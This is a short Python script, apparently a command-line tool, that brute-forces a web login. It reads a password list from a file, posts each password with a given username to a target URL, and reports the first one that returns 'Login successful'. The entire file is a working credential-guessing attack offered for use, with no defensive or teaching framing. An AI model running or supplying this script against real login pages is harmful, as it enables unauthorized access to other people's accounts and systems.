import requests
import sys

def brute_force(url, username, password_file):
    try:
        with open(password_file, 'r') as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        return f"Error: Password file '{password_file}' not found."

    print(f"Starting brute force on {url} with username: {username}")
    for password in passwords:
        print(f"Trying password: {password}")
        try:
            response = requests.post(url, data={'username': username, 'password': password})
            if response.status_code == 200 and "Login successful" in response.text:
                return f"Success! Username: {username}, Password: {password}"
        except requests.RequestException as e:
            return f"Request error: {e}"
    
    return "Brute force failed. No valid password found."

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python bruteforce_script.py <url> <username> <password_file>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    target_username = sys.argv[2]
    password_file_path = sys.argv[3]

    result = brute_force(target_url, target_username, password_file_path)
    print(result)
